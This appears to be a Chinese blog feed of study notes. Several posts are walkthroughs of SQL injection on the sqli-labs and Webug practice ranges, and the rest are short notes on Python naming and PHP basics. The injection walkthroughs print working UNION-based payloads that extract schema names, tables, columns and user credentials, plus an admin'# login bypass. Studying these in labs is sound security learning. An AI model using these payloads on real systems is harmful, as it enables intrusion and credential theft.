        <content type="html"><![CDATA[<p>虽然有 mysql注入天书，但是总感觉自己总结一下，学得会更扎实，写给自己看吧。下面解释并不多，主要是记录流程以及payload。对你来说，你应该自己亲手敲出这些payload，并且清楚地理解其含义，学会举一反三。</p><h2 id="检测注入点">检测注入点</h2><p>在 id=1 后面加一个英文引号，即：?id=1'</p><p>报错：....the right syntax to use near ''1'' LIMIT 0,1' at line 1</p><p>这里注意 near 后面最外围的引号是报错语句将 sql语句引起来用的，所以真实的 sql 语句是：'1'' LIMIT 0,1</p><p>由此可知</p><ol type="1"><li>字符型注入，即：php 源码写的是 where id=‘$id’</li><li>where 查询后面还有个 limit 一会儿加个注释，注释掉他。</li></ol><h2 id="猜字段数">猜字段数</h2><p>?id=-1' order by 3 --+结果为三个字段，即：此查询语句查询了三个字段。</p><h2 id="注入相关信息">注入相关信息</h2><p>注意：这里 id = -1' ，将 1 改成-1是为了让前面查询不到结果，这样查询结果只有我们写的 union查询后面查询出的结果了。</p><p>数据库，系统版本及当前数据库名, 当前登录用户，mysql数据库的路径等</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,concat_ws(&#x27;</span> , <span class="string">&#x27;, version(), database(), user(), @@datadir, @@version_compile_os),3 --+</span></span><br></pre></td></tr></table></figure><p>回显: 5.5.53 , security , root@localhost , C: , Win32</p><p>这里我们知道了，数据库版本：5.5.53，当前数据库的名字security，当前用户：root，mysql 数据库的路径： C:，系统版本：Win32</p><h2 id="爆数据库名">爆数据库名</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(distinct schema_name), 3 from information_schema.schemata --+</span></span><br></pre></td></tr></table></figure><p>回显: Your Loginname:information_schema,challenges,mysql,performance_schema,security,webug,webug_sys,webug_width_byte</p><p>这里简单介绍一下，information_schema 中的 schemata 表，存储着 mysql中所有数据库的数据。包括表名：schema_name，字符集等。</p><p>爆数据库名，正规的话就用，information_schema 中的 schemata 表</p><p>当然，不正规的方法也有，可以使用 information_schema 中的 tables 表或者 columns 表。</p><p>因为 tables 存储着 table_schema即每张表位于的数据库，这样又会有很多重复的，所以使用group_concat(distinct 字段名)去除重复的，并将其组合成一个以逗号分隔的字符串。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(distinct table_schema), 3 from information_schema.tables --+</span></span><br></pre></td></tr></table></figure><p>columns 表也是类似</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(distinct table_schema), 3 from information_schema.columns --+</span></span><br></pre></td></tr></table></figure><h2 id="爆表">爆表</h2><p>列出 security 数据库中的表</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(distinct table_name), 3 from information_schema.tables where table_schema=&#x27;</span>security<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>回显: Your Login name:emails,referers,uagents,users</p><p>爆表一般就用 informtion_schema 中的 tables列，当然你像上面爆库的时候，使用 columns 表中的 table_name 字段和group_concat(distinct 字段名)</p><p>回显：Your Login name:emails,referers,uagents,users</p><h2 id="爆列">爆列</h2><p>列出 securtiy 库的 users 表中的列名</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,group_concat(column_name),3 from information_schema.columns where table_schema=&#x27;</span>security<span class="string">&#x27; and table_name=&#x27;</span>users<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>回显：Your Login name:id,username,password</p><p>学到了注入列名的方法，在 columns 表中使用 where语句查询某个数据库下的某个表的字段名，字段名肯定是不会重复的，所以group_concat 不用使用 distinct。</p><h2 id="爆-users-的数据">爆 users 的数据</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,concat_ws(&#x27;</span> , <span class="string">&#x27;, username, password), 3 from security.users --+</span></span><br></pre></td></tr></table></figure><p>回显：Your Login name:Dumb , Dumb</p><h2 id="总结回顾">总结回顾：</h2><ol type="1"><li>学到了如何注入列名，可以对 webug 显错注入的流程进行改进。</li><li>需要系统地学习并总结一下 mysql 的系统数据库，尤其是information_schema 中的表，并来一篇笔记</li><li>对注入流程更加清晰了，再把 sql 注入介绍那篇博文加上 sql注入流程。</li></ol><p>推荐文章：</p><p><a href="https://zhuanlan.zhihu.com/p/22397620">你真的会 SQL注入攻击吗？（下）</a></p>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Python 命名规范</title>
      <link href="/blog/2019/07/25/programming/python/name_conventions/"/>
      <url>/blog/2019/07/25/programming/python/name_conventions/</url>
      
        <content type="html"><![CDATA[<h2 id="introduction">Introduction</h2><p>代码规范是一系列用来产生可维护，可扩展代码的指南。你编写的代码的规范程度决定了你在软件开发领域的职业生涯的寿命。我从Python PEP8文档中获取了这些代码命名规范信息，并尝试用简单明了的语言讲述，以便使得读者更容易理解与消化。通过本文的信息，你可以确保代码的质量，可读性和重用性。</p><p>你可以通过查阅 <ahref="https://www.techbeamers.com/python-code-optimization-tips-tricks/"><strong>Pythoncode optimization</strong></a> 来提高你所编写的 Python应用程序的代码性能与健壮性。此外，Github 上的 python-guide项目中关于代码实践的部分 <ahref="https://docs.python-guide.org/#writing-great-python-code">WritingGreat Python Code</a>，你也不能错过。</p><p>请记住：命名规范只是许多 Python 编码标准的一个方面。你可以在<ahref="https://www.python.org/dev/peps/pep-0008/"><strong>PEP8documentation</strong></a> 读到其他的方面。</p><ul class="task-list"><li><label><input type="checkbox" />Python其他方面的编码标准</label></li></ul><h2 id="应该避免的名称">应该避免的名称</h2><ul><li>单字符名称, 除了计数器和迭代器.</li><li>包/模块名中的连字符(<code>-</code>)</li><li>双下划线开头并结尾的名称(Python 保留,例如<code>__init__</code>)</li></ul><h2 id="命名约定">命名约定</h2><ul><li>所谓”内部(Internal)”表示仅模块内可用, 或者,在类内是保护或私有的.</li><li>用单下划线(<code>_</code>)开头表示模块变量或函数是 protected 的(使用<code>from module import *</code> 时不会包含).</li><li>用双下划线(<code>__</code>)开头的实例变量或方法表示类内私有.</li><li>将相关的类和顶级函数放在同一个模块里. 不像 Java,没必要限制一个类一个模块.</li><li>对类名使用大写字母开头的单词(如 <code>CapWords</code>, 即 Pascal风格), 但是模块名应该用小写加下划线的方式(如<code>lower_with_under.py</code>). 尽管已经有很多现存的模块使用类似于<code>CapWords.py</code> 这样的命名, 但现在已经不鼓励这样做,因为如果模块名碰巧和类名一致, 这会让人困扰.</li></ul><h2 id="python-之父-guido-推荐的规范">Python 之父 Guido 推荐的规范</h2><table><colgroup><col style="width: 22%" /><col style="width: 17%" /><col style="width: 60%" /></colgroup><thead><tr class="header"><th>Type</th><th>Public</th><th>Internal</th></tr></thead><tbody><tr class="odd"><td>Modules</td><td><code>lower_with_under</code></td><td><code>_lower_with_under</code></td></tr><tr class="even"><td>Packages</td><td><code>lower_with_under</code></td><td> </td></tr><tr class="odd"><td>Classes</td><td><code>CapWords</code></td><td><code>_CapWords</code></td></tr><tr class="even"><td>Exceptions</td><td><code>CapWords</code></td><td> </td></tr><tr class="odd"><td>Functions</td><td><code>lower_with_under()</code></td><td><code>_lower_with_under()</code></td></tr><tr class="even"><td>Global/Class Constants</td><td><code>CAPS_WITH_UNDER</code></td><td><code>_CAPS_WITH_UNDER</code></td></tr><tr class="odd"><td>Global/Class Variables</td><td><code>lower_with_under</code></td><td><code>_lower_with_under</code></td></tr><tr class="even"><td>Instance Variables</td><td><code>lower_with_under</code></td><td><code>_lower_with_under</code> (protected) or<code>__lower_with_under</code> (private)</td></tr><tr class="odd"><td>Method Names</td><td><code>lower_with_under()</code></td><td><code>_lower_with_under()</code> (protected) or<code>__lower_with_under()</code> (private)</td></tr><tr class="even"><td>Function/Method Parameters</td><td><code>lower_with_under</code></td><td> </td></tr><tr class="odd"><td>Local Variables</td><td><code>lower_with_under</code></td><td></td></tr></tbody></table><h2 id="references">References</h2><blockquote><ol type="1"><li><ahref="https://medium.com/@dasagrivamanu/python-naming-conventions-the-10-points-you-should-know-149a9aa9f8c7">PythonNaming Conventions — The 10 Points You Should Know</a></li><li><ahref="https://zh-google-styleguide.readthedocs.io/en/latest/google-python-styleguide/python_style_rules/#id16">Python风格规范</a></li></ol></blockquote>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webug之万能密码</title>
      <link href="/blog/2019/07/24/websec/sql_injection/universal_pass_of_webug/"/>
      <url>/blog/2019/07/24/websec/sql_injection/universal_pass_of_webug/</url>
      
        <content type="html"><![CDATA[<p>暑假闲来无事，想找个靶场练练手，找到了 Webug 4.0 靶场。</p><p>下面开始菜鸡之旅, 首先,从入门, 注入分类下开始练习.</p><h1 id="webug-靶场安装">Webug 靶场安装</h1><p>没啥说的，老铁。去<ahref="https://github.com/wangai3176/webug4.0">Webug Github</a> 下载完整2003 虚拟机，自带环境，直接启动 phpstudy，便可以愉快的玩耍了。</p><p>webug 中有个乌云知识库,虚拟机中好像没有自带,需要我们去下载.</p><p><ahref="https://github.com/S0urceC0der/wooyun-drop-fork"><strong>wooyun-drop-fork</strong></a></p><p>下一个压缩包, 解压后把里面的 drop 文件夹放到 C:下面就好了.</p><p><strong>注意：</strong>请务必在 phpstudy 切换版本那里将环境切换至PHP-5.3.29-nts +Apache。(否则等你对着注入入门题，死活注入不成功，查一下数据库日志，才发现默认版本对你的单引号做了转义时，就知道什么是绝望了。)</p><p>然后，主机访问虚拟机 IP 即可。用户名与密码都是 admin，成功进入。</p><p>在实战之前，先在 Chrome 上整个Hackbar，现在收费了，大家要支持正版呀。（我看见美刀就感觉贵了。于是，求助广大网友，Google关键字：hackbar 破解教程）</p><p>sql 注入使用 hackbar 会很方便</p><ol type="1"><li>load URL 将当前 URL 加载到 hackbar，可以使用 Encoding 中的 URLencode 与 URL decode 进行编码或解码</li><li>split URL 将目录与查询语句分开，便于更改，而且 hackbar 中的 URL不会被转义。</li><li>当遇到登陆框注入等 post 请求时，可以使用 Post data 自己写 post数据，避免地址栏转义，一次次改麻烦还眼花。</li></ol><p>下面来一个万能密码。</p><p>首先，我们要知道登录这种东西，必然是使用 post提交的，所以右键查看网页源码，找到用户名与密码的两个字段，username、password。</p><p>猜测大致 sql 语句：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select * <span class="keyword">from</span> user where name=<span class="variable">$name</span> <span class="keyword">and</span> passwd=<span class="variable">$passwd</span></span><br></pre></td></tr></table></figure><p>通过判断查询结果是否存在（大于 1 条记录）来判断是否正确。</p><p>当然，一般 <span class="math inline">\(passwd 是 md5加密后的数据。比如：\)</span>passwd = md5($_POST['passwd']);</p><p>下面，F12 上 hackbar 勾选 Post data，然后输入username=你要输入的用户名&amp;password=你要输入的密码</p><p>这里举个例子：username=admin'#&amp;password=dewc 然后 Exxcute flag出现。</p><p>两种注释方式：#与--[空格] (注: 这里是两个横线)</p><p>这个很简单啦。猜测存在用户名admin，然后用单引号闭合，在注释一下，后面的密码字段。即: admin' #</p><p>密码什么也不输入，然后登录，注入失败。。</p><p>然后发现，要随便输点密码。(我是不会告诉你，我看了源码的)。成功。</p><p>总结：</p><ol type="1"><li>hackbar 不愧是个人人称赞的利器。</li><li>注意中英文字符</li><li>一般你输入的数据在 sql 语句中间，往往后面还有语句，养成加#或--注释的习惯。</li><li>绕过登录时，密码总还是要输入点东西，（我看源码，判断用户名非空且密码非空后，才会进行后续操作）</li></ol><h2 id="参考资料">参考资料</h2><blockquote><ul><li>webug 靶场源码</li></ul></blockquote>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>webug之显错注入</title>
      <link href="/blog/2019/07/24/websec/sql_injection/basic_sql_injection_of_webug/"/>
      <url>/blog/2019/07/24/websec/sql_injection/basic_sql_injection_of_webug/</url>
      
        <content type="html"><![CDATA[<h1 id="基础知识">基础知识</h1><h2 id="mysql-注释">mysql 注释</h2><p>mysql 注释符有三种：</p><ol type="1"><li><p>#...</p></li><li><p>"-- ..."</p></li><li><p>/*...*/</p></li></ol><h2 id="mysql-常用函数">mysql 常用函数</h2><p>user() 当前登陆数据库的用户、version() mysql 的版本、database()当前数据库、@<span class="citation" data-cites="datadir">@datadir</span>数据库的路径、@<span class="citation"data-cites="version_compile_os">@version_compile_os</span>操作系统版本</p><p>@<span class="citation" data-cites="version">@version</span> 和version() 一样也是版本信息。</p><ol type="1"><li>concat(str1,str2,...)——没有分隔符地连接字符串</li><li>concat_ws(separator,str1,str2,...)——含有分隔符地连接字符串</li><li>group_concat(str1,str2,...)——连接一个组的所有字符串，并以逗号分隔每一条数据</li></ol><p><a href="https://my.oschina.net/MiniBu/blog/478342">MySQL连接字符串函数 CONCAT，CONCAT_WS，GROUP_CONCAT 使用总结</a></p><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。</p><p>请注意，UNION 内部的每个 SELECT语句必须拥有相同数量的列。列也必须拥有相似的数据类型。同时，每个 SELECT语句中的列的顺序必须相同。</p><p><strong>order by 数字, 首先这个数字一定在 1-(select查询的列的个数)之间, 数字是指按照你前面 select 的列的顺序, 从 1开始排号, 你写几,对应几号,也就是哪个字段. 所以 order by猜出的字段数,只是对应 sql 查询语句中 select的字段数,并不一定是表的所有字段. 除非查询语句使用的 select *,而这种情况很常见, 所以网上很多互相抄袭的资料,就都说成了猜解表的字段.我认为知道其中的区别还是很有必要的. </strong></p><p>以上知识肯定不够, 遇到一些细节性的,不清楚的就去实验,实在不行谷歌.</p><h1 id="显错注入">显错注入</h1><p>注意：万能密码中在用户名那里输入注释可以输入 --[空格] 或 #，即：真实的 MySQL 注释即可，但是在 URL 地址栏要注意字符会经过 URL编码，所以，你直接输入 --[空格] 或 # 是不管用的，你应该输入他们对应的URL 编码。</p><table><thead><tr class="header"><th>原注释</th><th>URL 编码</th></tr></thead><tbody><tr class="odd"><td>--[空格]</td><td>--%20 或者--+</td></tr><tr class="even"><td>#</td><td>%23</td></tr></tbody></table><p>至于 --+ 为啥是--[空格] 的 URL 编码，咱也不知道呀，大家都这样用。</p><p>如果一开始记不住的话，可以使用 Hackbar 的 SQL 下拉菜单中的 URLencode，对你写的#或--[空格]进行编码。</p><h2 id="检测注入点及注入类型">检测注入点及注入类型</h2><p>加一个单引号报错，根据报错语句，再加个注释，上面表格中三种 URL编码都可以，然后页面回显正常，代表注入正确, 而且是字符注入,即:php中数据库语句的 id 处是: id = '输入'</p><p>payload 1：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=<span class="number">1</span><span class="string">&#x27; --%20</span></span><br></pre></td></tr></table></figure><h2 id="猜表的字段数">猜表的字段数</h2><p>下面再在上面的基础上，使用 order by 猜字段,<strong>这里猜的字段数是前面开发者对 id 这个 sql查询语句中使用的字段数.</strong> 因为一般该 sql 语句都是使用 select *查询, 所以一般情况下,你猜出的这个查询语句的字段数,也就是表的字段数.</p><p>二分法 order by 10 回显错误、 order by 5 回显错误、order by 3回显错误、order by 2 回显正常，代表有两个字段。</p><h2 id="确定显示位">确定显示位</h2><p>下面找它的显示位（显示位指的是网页中能够显示数据的位置，这样才能利用sql语句将敏感信息显示给咱看呀，有的字段不显示在网页上，鬼知道是啥呀）。</p><p>下面让 id = -1是为了让前面的查询结果为空，让它查不出数据来，不占用显示位，这样后面咱们使用union select 查询出来的数据才能显示出来</p><p>payload 2：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; union select 1,2 --+</span></span><br></pre></td></tr></table></figure><p>然后，看看页面上哪里有 1 或者2，就知道哪个字段是显示位，显示位在那个位置。</p><p>这里的话，第二个字段是显示位，于是根据 MySQL常用函数构造如下语句：</p><p>payload 3:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT version(), concat_ws(&#x27;</span>, <span class="string">&#x27;, user(), version(), database(), @@datadir, @@version_compile_os) --+</span></span><br></pre></td></tr></table></figure><p>事已至此, 然并软, 我的 flag 呢.emm..</p><h2 id="爆表">爆表</h2><p>爆表, Why? 为什么要先爆表, 不先爆库呢?这里我们要知道我们使用的靶场,靶场作为一个库,你觉得它能把自己的 flag放到别的库里吗? 很多时候, 先干什么, 后干什么,都是有一定的逻辑在的,即使是经验, 也有为什么这么做的原因?希望你在学习的时候,多问问自己为什么这样做?</p><p>这里就需要补充一点知识了, <ahref="https://blog.csdn.net/qq_33326449/article/details/80405284">mysql中 information_schema.tables 字段说明</a>, 首先你要对 mysql 数据库元数据meta 的存放位置有一定的掌握.</p><p>information_schema 库存放着 mysql 数据的元数据. 其中 tables表中存放着库名, 表名,表类型等信息. table_schema 字段存放着所有的数据库名,table_name 存放着所有的表名.</p><p>首先从上面确定显示位中构造的 payload4 返回的数据得知, 当前使用的是webug 数据库. 然后构造下面 payload 列出 webug 库中的表名</p><p>payload 4:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT 1, concat(table_name,&#x27;</span> , <span class="string">&#x27;) from information_schema.tables where table_schema = &#x27;</span>webug<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>然后看返回的数据, 我的 flag 出现了, 然而怎么让它显示出来了又是个问题.</p><p>首先, 不要忘记它是张表,然后, 接着<strong>order by猜字段数</strong></p><p>这里猜解字段数也是个问题.</p><p><a href="https://nosec.org/home/detail/2245.html">如何在不知道 MySQL列名的情况下注入出数据？</a></p><p>目前,我从这篇文章里得到启发,可以使用下面的 payload,通过逐步递增括号内的 select 的数, 比如:select 1 union.. select 1,2union..., 啥时候不报错了, 便是字段数. (一般字段数最多也就 10 来个吧,要是有程序员建一张表用个 50/60 多个字段,我看他该被拿来祭天了! )</p><p>payload 5:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT 1,2 from (select 1,2 union select * from webug.flag)tabl --+</span></span><br></pre></td></tr></table></figure><p>才出来字段数,为 2 . 这就巧了, 系统 id 那个语句就是两个字段.这不禁让人想入非非: 第一个字段不显示,只有第二个字段显示, 作为入门,不会太坑,应该第二个字段, 就是 flag 的内容, 于是投机取巧的 payload便产生了.(注: mysql 支持跨表联合查询)</p><p>payload 6:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT * from webug.flag --+</span></span><br></pre></td></tr></table></figure><p>然后 flag 就出来了,作为一道入门题, 现在它已经完成了自己的使命.</p><h2 id="思考">思考</h2><p>作为要深入理解掌握 mysql 的人, 我们不禁思考,万一字段数不是两个,该怎么办呢?</p><p>思路很容易就有了: 只有一个显示位, 那可以使用在 select 时, 使用 concat函数将字段们都集中在第二个字段上显示.</p><p>根据以上知识, 构造 payload</p><p>payload 7:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT 1, concat_ws(&#x27;</span>$<span class="string">&#x27;,`1`,`2`)  from (select 1,2 union select * from webug.flag)tabl --+</span></span><br></pre></td></tr></table></figure><p>显示位显示: 1$21$dfafdasfafdsadfa</p><p>刚开始我还纳闷怎么两个$, 后来才想起来,这是两条记录.下面的表格是以下语句的查询结果集.其中第一行是表名,共两条记录.(因为第一条记录是我们 select 1,2联合查询插入的.)</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> webug.flag;</span><br></pre></td></tr></table></figure><table><thead><tr class="header"><th>1</th><th>2</th></tr></thead><tbody><tr class="odd"><td>1</td><td>2</td></tr><tr class="even"><td>1</td><td>dfafdasfafdsadfa</td></tr></tbody></table><p>其实我们控制显示位显示的并不完美,万一有多条记录,怎么办?一堆都显示出来不好看.</p><p>我们可以使用 orde by 和 limit 来优化结果.但是可能是语句太复杂(我测试比较简单的语句不报错), 我这边使用 order by别名(给 concat_ws 的数据起一个别名) 时, 报错. 不过, 知道这个就好了,万一以后用得到呢.</p><h2 id="进一步爆库爆表">进一步爆库爆表</h2><p>虽然 flag 已经拿到了,这里深入一下, 再做几个示例, 毕竟之前你都知道了,这个是使用 root 登录的想看什么有什么,这个要是在实战中,这个站已经可以被拿下了. 顺便深入学习一下 mysql 的information_schema 库.</p><h3 id="爆-webug-中的用户名以及密码">爆 webug 中的用户名以及密码</h3><p>//猜列名 payload 8:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT 1,2 from (select 1,2,3 union select * from webug.user)tabl --+</span></span><br></pre></td></tr></table></figure><p>爆 webug 中的用户名以及密码 payload 9:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT 1,concat_ws(&#x27;</span> , <span class="string">&#x27;, `1`,`2`,`3`) from (select 1,2,3 union select * from webug.user)tabl --+</span></span><br></pre></td></tr></table></figure><p>回显: 1 , 2 , 31 , admin , admin</p><p>下面为上面 payload 9 括号中 select 的结果集.</p><table><thead><tr class="header"><th>1</th><th>2</th><th>3</th></tr></thead><tbody><tr class="odd"><td>1</td><td>2</td><td>3</td></tr><tr class="even"><td>1</td><td>admin</td><td>admin</td></tr></tbody></table><p>虽然不知道字段名, 但是看着这表名 user, 看着这数据 admin, admin,就算是菜鸡,咱也知道, 这是用户名和密码呀. (推断原表结构大致为: idusername password)</p><h3 id="爆-security-库的表名">爆 security 库的表名</h3><p>security 为 sqli-labs 对应的数据库, 相信你们都有的</p><p>构造 payload 10:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=-<span class="number">1</span><span class="string">&#x27; UNION SELECT 1, concat(table_name,&#x27;</span> , <span class="string">&#x27;) from information_schema.tables where table_schema = &#x27;</span>security<span class="string">&#x27; --+</span></span><br></pre></td></tr></table></figure><p>回显: emails , referers , uagents , users ,</p><p>作为菜鸟来说，这个注入就基本完成了，至于要是还有什么深入的理解，以后理解了再说吧emm...</p><h2 id="总结回顾">总结回顾</h2><ol type="1"><li>要好好掌握数据库的元数据库, 对应 mysql 中 information_schema 库,尤其是 tables 表. 以后学习 sqlserver 注入,也要这样学.</li><li>如何爆字段名好像还没有学会, 有时间得学一下.</li><li>mysql 数据库命名规范有时间要看一看.</li><li>concat 和 concat_ws 可以用来分割不同字段/数据,至于分隔符选什么,不要选 # , 分号等敏感字符(万一给转义了),其他的自己看着来吧.</li><li>不同版本数据库有些功能可能不同, 以后渗透的时候,首先注入出数据库版本, 然后自己安装一个对应版本数据库, 这样在构造 paylaod的时候就更有把握了, 出错也知道是为什么出错. (ps.避免自己在自己电脑的版本上测试 payload 用到的的某些细节特性正常,但是测试系统的版本不支持该特性).</li></ol>]]></content>
      
      
      <categories>
          
          <category> websec </category>
          
          <category> sql injection </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>PHP基本语法规范及常量与变量</title>
      <link href="/blog/2019/07/23/programming/php/php_basic_syntax_and_const_vari/"/>
      <url>/blog/2019/07/23/programming/php/php_basic_syntax_and_const_vari/</url>
      
        <content type="html"><![CDATA[<h1 id="php-基本语法规则">PHP 基本语法规则</h1><h2 id="php-标记">PHP 标记</h2><p>PHP 语言，是一种可以嵌入到 “html” 代码中的后台处理语言（程序）</p><p>有以下几种标记形式，只推荐第一种。</p><ol type="1"><li><p>&lt;?php php 代码写在这里..... ?&gt;</p></li><li><p>&lt;script language="php" &gt; php 代码写在这里.....&lt;/script&gt;</p></li><li><p>&lt;? php 代码写在这里..... ?&gt;</p><p>此种方法需要到 php.ini 中进行配置：short_open_tag = On //默认为Off，表示不能用该形式。</p></li></ol><p><strong>注意：</strong></p><p>纯 PHP 代码：可以省略标记结尾符。</p><p>后面，我们会写很多“纯 php 代码文件”（里面没有任何 html 代码）。</p><h2 id="php-语句结束符">PHP 语句结束符</h2><p>使用英文分号（;）表示一条语句的结束。</p><h2 id="php-输出">PHP 输出</h2><p>通过 PHP，有两种在浏览器输出文本的基础指令：<strong>echo</strong> 和<strong>print</strong>。</p><h2 id="php-注释">PHP 注释</h2><p>和 C++ 一样，单行注释：//注释内容 多行注释：/_ 注释内容_/</p><h2 id="php-中的引号">PHP 中的引号</h2><ol type="1"><li><p>字符串</p><p>在 PHP中，字符串的定义可以使用单引号，也可以使用双引号。但是必须使用同一种单或双引号来定义字符串，如：‘Hello"和“Hello'为非法的字符串定义。</p></li><li><p>单引号</p><p>双引号里面的字段会经过编译器解释然后再当作 HTML代码输出，但是单引号里面的不需要解释，直接输出。</p></li><li><p>html 使用啥引号</p><p>要知道 php 最终要输出 html，所以 php 中使用 html时，使用单引号即可。</p><p>html 包含很多的双引号使用，可以用单引号包含起来，是没有问题的。双引号虽好，能包含变量和转义字符，但是效率比单引号低，能用单引号的尽量用单引号，不可忽略的是，要注意区分英文和中文引号</p><p><strong>注：单引号里面的双引号中的变量不会解析！</strong></p></li></ol><h1 id="变量">变量</h1><p>定义形式： $变量名 = 具体的数据;</p><p>注意：<strong>变量名区分大小写</strong></p><h2 id="变量的命名规则">变量的命名规则</h2><p>与 C++ 相同，字母、数字、下划线，不以数字开头。</p><p>骆驼命名法（小驼峰命名法）：第一个单词首字母小写，其余单词首字母大写。</p><p>childAge, yungerAge, parentHouse, myParentHouse,myParentHousePrice</p><p>其中 JavaScript 的函数命名规则便是小驼峰命名法。</p><p>帕斯卡命名法（大驼峰命名法）：所有单词都首字母大写。</p><p>ChildAge, YungerAge, ParentHouse, MyParentHouse,MyParentHousePrice</p><h2 id="变量的操作">变量的操作</h2><p>赋值 $v1 = 'Hello World'; 取值: echo $v1;</p><h3 id="判断变量isset">判断变量：isset()</h3><p>判断一个“变量名”是否里面存储了数据！结果：true（真，表示有），或者false（假，表示没有）。</p><p>使语法：isset( $变量名 );</p><p>还有一个特殊的赋值，赋值后，变量中也没有数据，如下：</p><p>$v5 = null; //null是一个特殊的“数据”（值），该数据的含义是：没有数据。</p><p>即此时判断 isset($v5) 的结果是“false”。</p><p>因为上面直接 echo isset($v5) ；结果并不明显，可以使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">var_dump</span>(<span class="keyword">isset</span>(<span class="variable">$v5</span>));</span><br></pre></td></tr></table></figure><p><strong>var_dump()</strong> 函数用于输出变量的相关信息。</p><p><strong>var_dump()</strong>函数显示关于一个或多个表达式的结构信息，包括表达式的类型与值。数组将递归展开值，通过缩进显示其结构。</p><p>删除/销毁变量 unset()</p><p>当一个变量中存储了数据，我们也可以去销毁（删除）它，语法如下：</p><p>unset( $变量名 ）。</p><p>删除变量的本质是：断开变量名跟其关联过的那个数据之间的“联系”，断开之后，该变量就不再指向某个数据了，其isset() 判断的结果为 false。</p><h2 id="变量传值">变量传值</h2><h3 id="值传递">值传递</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = <span class="variable">$v2</span>;</span><br></pre></td></tr></table></figure><h3 id="引用传递">引用传递</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$v1</span> = &amp;<span class="variable">$v2</span>;</span><br></pre></td></tr></table></figure><p>要注意的有一点: unset() 是断开名称与内存数据之间的联系.所以对两个引用同一块内存数据的变量来说, 对一个数据进行 unset()不会影响另一个数据.</p><p>原理你懂的。</p><h2 id="预定义变量">预定义变量</h2><p>在 PHP 语言内部，有一些（也就 10来个）变量，是现成的，直接可以使用，这就是所谓预定义变量。</p><p>我们要做的是事情就是：理解该变量是什么意思，以及怎么用！</p><h3 id="get-变量">$_GET 变量</h3><p>代表浏览器表单通过“get”方式提交的所有数据（集），可以称为“get数据”。</p><p>也可以理解为：</p><p>$_GET 变量里面会“自动存储”（保存/装载）提交到某个文件中的 GET数据。</p><p>而 GET 数据，是在一个页面以“get”方式请求的时候提交的数据。</p><p>使用 get 方法提交表单的 URL 一般有fileName.php?userName=张三&amp;age=15 